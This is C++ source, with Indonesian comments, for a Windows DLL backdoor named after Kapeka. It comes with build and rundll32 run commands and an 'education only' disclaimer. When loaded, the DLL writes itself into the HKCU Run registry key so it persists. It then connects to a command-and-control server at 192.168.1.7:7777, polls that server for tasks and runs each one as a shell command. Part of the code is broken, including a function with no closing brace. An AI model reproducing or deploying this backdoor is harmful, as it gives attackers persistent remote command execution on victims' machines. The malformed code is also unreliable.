// Permissions: Pastikan Anda memiliki izin yang sesuai untuk menjalankan dan menguji DLL ini pada sistem Windows.
// Dependencies: DLL ini bergantung pada pustaka Winsock (Ws2_32.lib) yang merupakan standar di Windows, sehingga tidak memerlukan dependensi tambahan.
// Anti-Virus: Harap diperhatikan bahwa banyak program anti-virus akan mendeteksi dan memblokir aktivitas backdoor seperti ini. 
// Kode ini hanya untuk keperluan edukasi, penggunaan ilegal tidak dibenarkan.

// Disclaimer: Backdoor ini hanya untuk riset dan simulasi. Saya tidak bertanggung jawab atas penyalahgunaan payload ini untuk tujuan ilegal.

// Kompilasi manual: 
// x86_64-w64-mingw32-g++ -shared -o kapeka_backdoor.dll kapeka_backdoor.cpp -lws2_32

// Jalankan DLL dengan: rundll32.exe kapeka_backdoor.dll,ExportedFunction -d

#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <fstream>
#include <vector>

// Deklarasi ekspor fungsi utama agar dapat diakses dari luar.
// Fungsi ini tidak melakukan operasi apapun dalam contoh ini.
#pragma comment(linker, "/EXPORT:ExportedFunction=_ExportedFunction@0,PRIVATE")
#pragma comment(lib, "Ws2_32.lib")

// Konfigurasi alamat dan port server C2
#define C2_SERVER_IP "192.168.1.7" // IP Server Command and Control (C2)
#define C2_SERVER_PORT 7777        // Port Server C2

// Deklarasi fungsi yang diekspor untuk digunakan oleh DLL.
extern "C" __declspec(dllexport) void ExportedFunction();

// Fungsi dan variabel untuk manajemen thread
void primary_thread(HANDLE exit_event, HANDLE new_task_event);
void logoff_monitor_thread(HANDLE exit_event);
void task_monitor_thread(HANDLE new_task_event, HANDLE task_completed_event);
void task_completion_monitor_thread(HANDLE task_completed_event);
std::string execute_command(const std::string& cmd); // Eksekusi perintah sistem.
std::vector<std::string> split(const std::string& str, const std::string& delimiter); // Fungsi pembantu untuk memisahkan string.
void log(const std::string& message); // Logging ke file teks.
bool initialize_winsock(); // Inisialisasi Winsock.
SOCKET connect_to_c2(); // Koneksi ke server C2.
void close_socket(SOCKET sock); // Menutup koneksi socket.
void send_data(SOCKET sock, const std::string& data); // Mengirim data ke server C2.
std::string receive_data(SOCKET sock); // Menerima data dari server C2.

// Variabel global untuk manajemen thread.
HANDLE exit_event;
HANDLE new_task_event;
HANDLE task_completed_event;

// Fungsi utama yang diekspor oleh DLL.
extern "C" __declspec(dllexport) void ExportedFunction() {
    // Fungsi ini tidak melakukan operasi apapun. Hanya digunakan untuk ekspor.
}

// Fungsi entri DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            // Saat DLL dimuat ke proses
            char cmdLine[MAX_PATH];
            GetModuleFileNameA(hModule, cmdLine, MAX_PATH); // Mendapatkan path file DLL
            std::string cmd = GetCommandLineA();

            // Membuat event untuk manajemen thread.
            exit_event = CreateEvent(NULL, TRUE, FALSE, NULL);
            new_task_event = CreateEvent(NULL, TRUE, FALSE, NULL);
            task_completed_event = CreateEvent(NULL, TRUE, FALSE, NULL);

            if (cmd.find("-d") != std::string::npos) {
                // Menambahkan entri startup jika dijalankan dengan flag "-d".
                HKEY hKey;
                RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
                RegSetValueEx(hKey, "KapekaBackdoor", 0, REG_SZ, (BYTE *)cmdLine, strlen(cmdLine) + 1);
                RegCloseKey(hKey);
            }

            // Membuat thread untuk menjalankan fungsi utama dan fungsi pemantauan.
            std::thread(primary_thread, exit_event, new_task_event).detach();
            std::thread(logoff_monitor_thread, exit_event).detach();
            std::thread(task_monitor_thread, new_task_event, task_completed_event).detach();
            std::thread(task_completion_monitor_thread, task_completed_event).detach();
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            // Menutup semua event saat proses selesai atau thread dilepas.
            SetEvent(exit_event);
            CloseHandle(exit_event);
            CloseHandle(new_task_event);
            CloseHandle(task_completed_event);
            break;
    }
    return TRUE;
}

// Thread utama untuk mengelola komunikasi dengan server C2.
void primary_thread(HANDLE exit_event, HANDLE new_task_event) {
    if (!initialize_winsock()) {
        log("Primary thread: Gagal inisialisasi Winsock.");
        return;
    }

    SOCKET c2_socket = connect_to_c2();
    if (c2_socket == INVALID_SOCKET) {
        log("Primary thread: Gagal menghubungkan ke server C2.");
        WSACleanup();
        return;
    }

    while (WaitForSingleObject(exit_event, 1000) == WAIT_TIMEOUT) {
        log("Primary thread: Memeriksa server C2...");
        send_data(c2_socket, "poll");
        std::string response = receive_data(c2_socket);

        if (!response.empty()) {
            log("Primary thread: Tugas baru diterima.");
            std::ofstream out("tasks.txt");
            out << response;
            out.close();
            SetEvent(new_task_event);
        }
        Sleep(5000); // Jeda sebelum polling berikutnya.
    }

    close_socket(c2_socket);
    WSACleanup();
    log("Primary thread: Keluar...");
}

// Thread untuk memantau event log off dari sistem.
void logoff_monitor_thread(HANDLE exit_event) {
    while (WaitForSingleObject(exit_event, 1000) == WAIT_TIMEOUT) {
        log("Logoff monitor thread: Memeriksa event logoff...");
        Sleep(10000); // Jeda sebelum memeriksa lagi.
    }
    log("Logoff monitor thread: Keluar...");
}

// Thread untuk memantau dan memproses tugas baru.
void task_monitor_thread(HANDLE new_task_event, HANDLE task_completed_event) {
    while (WaitForSingleObject(new_task_event, 1000) == WAIT_TIMEOUT) {
        log("Task monitor thread: Menunggu tugas baru...");

        std::ifstream in("tasks.txt");
        std::string line;
        while (std::getline(in, line)) {
            log("Memproses tugas: " + line);
            std::string result = execute_command(line);
            log("Hasil tugas: " + result);
        }
        in.close();

        SetEvent(task_completed_event);
        Sleep(1000); // Jeda untuk simulasi proses tugas.
    }
    log("Task monitor thread: Keluar...");
}

// Thread untuk memantau dan menandai bahwa tugas telah selesai.
void task_completion_monitor_thread(HANDLE task_completed_event) {
    while (WaitForSingleObject(task_completed_event, 1000) == WAIT_TIMEOUT) {
        log("Task completion monitor thread: Tugas selesai.");

        // Simulasi mengirim hasil kembali ke server C2.
        std::ofstream out("results.txt", std::ios_base::app);
        out << "Tugas selesai dengan sukses\n";
        out.close();

        ResetEvent(task_completed_event);
    }
    log("Task completion monitor thread: Keluar...");
}

// Fungsi untuk mengeksekusi perintah sistem dan mengembalikan hasilnya.
std::string execute_command(const std::string& cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        return "popen gagal!";
    }
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

// Fungsi untuk membagi string berdasarkan delimiter tertentu.
std::vector<std::string> split(const std::string& str, const std::string& delimiter) {
    std::vector<std::string> tokens;
    size_t prev = 0, pos = 0;
    do {
        pos = str.find(delimiter, prev);
        if (pos == std::string::npos) pos = str.length();
        std::string token = str.substr(prev, pos - prev);
        if (!token.empty()) tokens.push_back(token);
        prev = pos + delimiter.length();
    } while (pos < str.length() && prev < str.length());
    return tokens;
}

// Fungsi untuk mencatat log ke dalam file log.txt.
void log(const std::string& message) {
    std::ofstream logFile("log.txt", std::ios_base::app);
    logFile << message << std::endl;
}

// Fungsi untuk menginisialisasi Winsock.
bool initialize_winsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        log("Inisialisasi Winsock gagal.");
        return false;
    }

// Fungsi untuk membuat koneksi ke server Command and Control (C2)
SOCKET connect_to_c2() {
    // Membuat socket menggunakan protokol TCP (SOCK_STREAM)
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        // Jika socket gagal dibuat, log pesan kesalahan dan kembalikan nilai INVALID_SOCKET
        log("Socket creation failed."); 
        return INVALID_SOCKET;
    }

    // Menentukan alamat dan port server C2
    sockaddr_in server;
    server.sin_family = AF_INET; // Keluarga alamat IPv4
    server.sin_addr.s_addr = inet_addr(C2_SERVER_IP); // Konversi IP dari string ke bentuk biner
    server.sin_port = htons(C2_SERVER_PORT); // Konversi port ke byte order jaringan (big-endian)

    // Mencoba menghubungkan ke server C2
    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        // Jika koneksi gagal, log pesan kesalahan, tutup socket, dan kembalikan nilai INVALID_SOCKET
        log("Connection to C2 server failed.");
        closesocket(sock);
        return INVALID_SOCKET;
    }

    // Jika koneksi berhasil, log pesan sukses
    log("Connected to C2 server.");
    return sock; // Kembalikan objek socket yang terhubung
}

// Fungsi untuk menutup koneksi socket
void close_socket(SOCKET sock) {
    // Menutup socket menggunakan fungsi closesocket
    closesocket(sock);
    log("Socket closed."); // Log pesan bahwa socket telah ditutup
}

// Fungsi untuk mengirim data ke server C2
void send_data(SOCKET sock, const std::string& data) {
    // Mengirim data ke server melalui socket yang telah terhubung
    send(sock, data.c_str(), data.length(), 0);
    log("Data sent: " + data); // Log pesan bahwa data telah dikirim
}

// Fungsi untuk menerima data dari server C2
std::string receive_data(SOCKET sock) {
    char buffer[512]; // Buffer untuk menyimpan data yang diterima
    // Menerima data dari server, maksimal sebesar ukuran buffer
    int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
    if (bytesReceived == SOCKET_ERROR) {
        // Jika terjadi kesalahan saat menerima data, log pesan kesalahan dan kembalikan string kosong
        log("Receive data failed.");
        return "";
    }
    // Menambahkan karakter null-terminator untuk mengakhiri string
    buffer[bytesReceived] = '\0';
    // Konversi buffer ke objek string untuk memudahkan manipulasi
    std::string data(buffer);
    log("Data received: " + data); // Log pesan bahwa data telah diterima
    return data; // Kembalikan data yang diterima dalam bentuk string
}
